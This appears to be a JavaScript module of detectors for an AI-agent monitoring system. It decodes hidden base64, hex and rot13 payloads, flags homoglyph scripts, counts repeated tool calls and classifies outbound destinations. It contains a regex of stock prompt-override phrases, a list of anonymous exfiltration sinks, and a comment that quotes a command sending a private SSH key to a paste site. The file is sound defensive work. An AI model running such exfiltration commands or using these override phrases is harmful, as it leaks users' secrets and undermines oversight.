/**
 * Deterministic detectors: the things Jev is documented to be bad at, computed
 * in code and handed to it as facts.
 *
 * Three of Jev 1.13's published weaknesses land directly on HALO's taxonomy:
 *
 *   - counting and arithmetic are unreliable  -> GENERATION_RUNAWAY_ATTACK
 *     depends on "how many times has this repeated"
 *   - non-English accuracy is lower           -> MULTILINGUAL_OBFUSCATION is
 *     definitionally non-English
 *   - literal reading                         -> ENCODING_OBFUSCATION hides the
 *     payload precisely so a literal reader sees nothing
 *
 * So these are decided here, deterministically, and the results are injected
 * into state as `derived` facts. Jev then reasons over a decoded, counted,
 * script-annotated view instead of being asked to do arithmetic or to see
 * through base64. Policy also reads them directly as independent evidence.
 */

const ZERO_WIDTH = /[​-‏‪-‮⁠-⁯﻿]/g;

// Scripts whose presence alongside Latin is a homoglyph-substitution signal.
const SCRIPT_RANGES = [
  ["Latin", /[A-Za-z]/],
  ["Cyrillic", /[Ѐ-ӿ]/],
  ["Greek", /[Ͱ-Ͽ]/],
  ["Arabic", /[؀-ۿ]/],
  ["Hebrew", /[֐-׿]/],
  ["Han", /[一-鿿]/],
  ["Hiragana", /[぀-ゟ]/],
  ["Katakana", /[゠-ヿ]/],
  ["Hangul", /[가-힯]/],
  ["Devanagari", /[ऀ-ॿ]/],
  ["Thai", /[฀-๿]/],
  ["Cherokee", /[Ꭰ-᏿]/],
];

/** Words that, once something is decoded, indicate the payload was an instruction. */
const INJECTION_LEXICON =
  /\b(ignore|disregard|forget|override|bypass|jailbreak|system prompt|previous instructions|prior instructions|you are now|act as|developer mode|do anything now|reveal|exfiltrat|print your|repeat everything)\b/i;

/** Contexts where base64 is ordinary and must not be treated as obfuscation. */
const BENIGN_B64_CONTEXT =
  /\b(sha256|sha512|md5|integrity|checksum|signature|certificate|data:image|base64-encoded image|jwt|public key|BEGIN CERTIFICATE|source-?map|favicon|\.png|\.jpg|\.woff)\b/i;

/** @param {string} s */
export function stripZeroWidth(s) {
  return s.replace(ZERO_WIDTH, "");
}

/** @param {string} s */
export function countZeroWidth(s) {
  return (s.match(ZERO_WIDTH) ?? []).length;
}

/** Shannon entropy in bits/char. High entropy + long run = encoded blob. @param {string} s */
export function entropy(s) {
  if (!s.length) return 0;
  const freq = new Map();
  for (const ch of s) freq.set(ch, (freq.get(ch) ?? 0) + 1);
  let h = 0;
  for (const n of freq.values()) {
    const p = n / s.length;
    h -= p * Math.log2(p);
  }
  return h;
}

/** @param {string} text */
export function scriptsUsed(text) {
  const found = [];
  for (const [name, re] of SCRIPT_RANGES) if (re.test(text)) found.push(name);
  return found;
}

/**
 * Find base64 / hex runs and decode them. Returns only decodes that produced
 * plausible text -- random binary is not an injection attempt.
 * @param {string} text
 */
export function decodeEmbedded(text) {
  /** @type {{encoding: string, decoded: string, looksLikeInstruction: boolean}[]} */
  const out = [];
  const seen = new Set();

  for (const m of text.matchAll(/[A-Za-z0-9+/]{24,}={0,2}/g)) {
    const raw = m[0];
    if (seen.has(raw)) continue;
    seen.add(raw);
    // Skip when the surrounding 80 chars mark it as ordinary encoded data.
    const around = text.slice(Math.max(0, m.index - 80), m.index + raw.length + 80);
    if (BENIGN_B64_CONTEXT.test(around)) continue;
    const decoded = tryDecodeBase64(raw);
    if (decoded && isMostlyPrintable(decoded) && /\s/.test(decoded)) {
      out.push({
        encoding: "base64",
        decoded: decoded.slice(0, 500),
        looksLikeInstruction: INJECTION_LEXICON.test(decoded),
      });
    }
  }

  for (const m of text.matchAll(/(?:[0-9a-fA-F]{2}[\s:]?){16,}/g)) {
    const hex = m[0].replace(/[\s:]/g, "");
    if (hex.length % 2 || seen.has(hex)) continue;
    seen.add(hex);
    const decoded = Buffer.from(hex, "hex").toString("utf8");
    if (isMostlyPrintable(decoded) && /\s/.test(decoded)) {
      out.push({
        encoding: "hex",
        decoded: decoded.slice(0, 500),
        looksLikeInstruction: INJECTION_LEXICON.test(decoded),
      });
    }
  }

  const rot = text.replace(/[a-zA-Z]/g, (c) => {
    const base = c <= "Z" ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
  });
  if (INJECTION_LEXICON.test(rot) && !INJECTION_LEXICON.test(text)) {
    out.push({ encoding: "rot13", decoded: rot.slice(0, 500), looksLikeInstruction: true });
  }

  return out;
}

function tryDecodeBase64(s) {
  try {
    const buf = Buffer.from(s, "base64");
    if (buf.length < 8) return null;
    // reject when re-encoding does not round-trip: it was not really base64
    if (buf.toString("base64").replace(/=+$/, "") !== s.replace(/=+$/, "")) return null;
    return buf.toString("utf8");
  } catch {
    return null;
  }
}

function isMostlyPrintable(s) {
  if (!s.length) return false;
  let printable = 0;
  for (const ch of s) {
    const c = ch.codePointAt(0);
    if (c === 9 || c === 10 || c === 13 || (c >= 32 && c < 127) || c > 160) printable++;
  }
  return printable / s.length > 0.85;
}

/**
 * Repetition analysis over prior tool calls. Counting in code, because Jev's
 * model card says not to ask it to count.
 * @param {{tool?: string, args?: unknown}[]} calls
 */
export function analyzeRepetition(calls = []) {
  if (calls.length === 0) return { total: 0, maxIdenticalRun: 0, distinctRatio: 1, isRepetitive: false };
  const keys = calls.map((c) => `${c.tool}:${stableStringify(c.args)}`);
  const distinct = new Set(keys).size;

  let maxRun = 1;
  let run = 1;
  for (let i = 1; i < keys.length; i++) {
    run = keys[i] === keys[i - 1] ? run + 1 : 1;
    if (run > maxRun) maxRun = run;
  }

  const counts = new Map();
  for (const k of keys) counts.set(k, (counts.get(k) ?? 0) + 1);
  const maxIdentical = Math.max(...counts.values());

  return {
    total: calls.length,
    maxIdenticalRun: maxRun,
    maxIdenticalTotal: maxIdentical,
    distinctRatio: +(distinct / calls.length).toFixed(3),
    isRepetitive: calls.length >= 8 && (maxRun >= 5 || distinct / calls.length < 0.25),
  };
}

export function stableStringify(v) {
  if (v === null || typeof v !== "object") return JSON.stringify(v) ?? "null";
  if (Array.isArray(v)) return `[${v.map(stableStringify).join(",")}]`;
  return `{${Object.keys(v)
    .sort()
    .map((k) => `${JSON.stringify(k)}:${stableStringify(v[k])}`)
    .join(",")}}`;
}

/**
 * Destination reputation, computed deterministically.
 *
 * Measured lesson (probe3, v3): asking Jev "is the destination trusted" wrecked
 * the exfiltration signal, because it folded policy into an observation. So the
 * signal only reports THAT data goes outward; WHERE it goes is decided here, in
 * code, as policy. This is what separates `gh secret set` (to the user's own CI)
 * from `curl -d @id_rsa paste.ee` (to an anonymous sink) -- both of which Jev
 * correctly scores as outbound exfiltration.
 */
const ANONYMOUS_SINK =
  /\b(paste\.ee|pastebin\.com|hastebin|ix\.io|transfer\.sh|0x0\.st|file\.io|ngrok\.io|ngrok-free\.app|webhook\.site|requestbin|pipedream\.net|burpcollaborator|oastify|interact\.sh|dnslog|termbin\.com|bashupload|anonfiles|gofile\.io|tmpfiles\.org|controlc\.com|glot\.io|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/i;

// First-party / known-good egress: package registries, source hosts, the user's
// own CI and observability, and major SaaS APIs a developer legitimately calls
// with that service's own credential. Reaching these with local data is
// ordinary devops, not exfiltration.
const KNOWN_EGRESS =
  /\b(github\.com|githubusercontent\.com|gitlab\.com|bitbucket\.org|npmjs\.org|registry\.npmjs|pypi\.org|files\.pythonhosted|crates\.io|rubygems\.org|packagist\.org|go\.dev|vercel\.com|netlify\.com|fly\.io|heroku|render\.com|sentry\.io|datadoghq\.com|newrelic\.com|amazonaws\.com|s3\.[a-z0-9-]+\.amazonaws|blob\.core\.windows\.net|googleapis\.com|cloudflare|openai\.com|anthropic\.com|api\.stripe\.com|coingecko\.com|hashicorp|vaultproject|slack\.com|atlassian\.net|hcaptcha|api\.github)\b/i;

// Tools whose whole purpose is authorized egress to first-party infra.
const KNOWN_EGRESS_TOOL =
  /^(gh|git|vercel|netlify|sentry-cli|aws|gcloud|az|kubectl|docker|npm|pnpm|yarn|pip|cargo|heroku|flyctl|wrangler|terraform)\b/i;

/** @param {string} text */
export function classifyDestinations(text) {
  const urls = [...text.matchAll(/https?:\/\/[^\s"'`)>\]]+/gi)].map((m) => m[0]);
  const firstTok = (text.trim().match(/^\S+/) ?? [""])[0];
  const anonymous = ANONYMOUS_SINK.test(text);
  const known = KNOWN_EGRESS.test(text) || KNOWN_EGRESS_TOOL.test(firstTok);
  return {
    urls,
    anonymous_sink: anonymous,
    known_egress: known && !anonymous,
    // The dangerous shape: outbound to a place with no first-party relationship.
    untrusted_egress: anonymous || (urls.length > 0 && !known),
  };
}

/**
 * Run every detector over an event and return `derived` facts for the state.
 * @param {import("./state.js").HaloEvent} event
 */
export function deriveFacts(event) {
  const conversationText = (event.conversation ?? []).map((m) => m.content ?? "").join("\n");
  const toolText = (event.tool_results ?? []).map((r) => r.content ?? "").join("\n");
  const allText = `${conversationText}\n${toolText}`;

  const zeroWidth = countZeroWidth(allText);
  const scripts = scriptsUsed(allText);
  const decoded = decodeEmbedded(allText);
  const repetition = analyzeRepetition(event.prior_tool_calls ?? []);

  // For destination analysis, prefer the actual shell command (its first token
  // is the real egress tool, e.g. `aws`/`vercel`/`gh`) over the wrapper tool
  // name ("Bash"). Fall back to the stringified args for structured tools.
  const ca = event.current_action;
  const actionText = ca
    ? String(ca.args?.command ?? "") || `${ca.tool} ${stableStringify(ca.args ?? {})}`
    : "";
  const destinations = classifyDestinations(actionText);

  const highEntropyRun = (() => {
    let worst = 0;
    for (const m of allText.matchAll(/\S{40,}/g)) worst = Math.max(worst, entropy(m[0]));
    return +worst.toFixed(2);
  })();

  return {
    obfuscation: {
      zero_width_chars: zeroWidth,
      scripts_present: scripts,
      mixed_script: scripts.filter((s) => s !== "Latin").length > 0 && scripts.includes("Latin"),
      non_english_script: scripts.some((s) => s !== "Latin"),
      max_token_entropy: highEntropyRun,
      decoded_payloads: decoded,
      // the hard signal: something was hidden AND it was an instruction
      hidden_instruction_found:
        decoded.some((d) => d.looksLikeInstruction) || (zeroWidth > 4 && INJECTION_LEXICON.test(stripZeroWidth(allText))),
    },
    repetition,
    destinations,
    volume: {
      conversation_chars: conversationText.length,
      tool_result_chars: toolText.length,
    },
  };
}
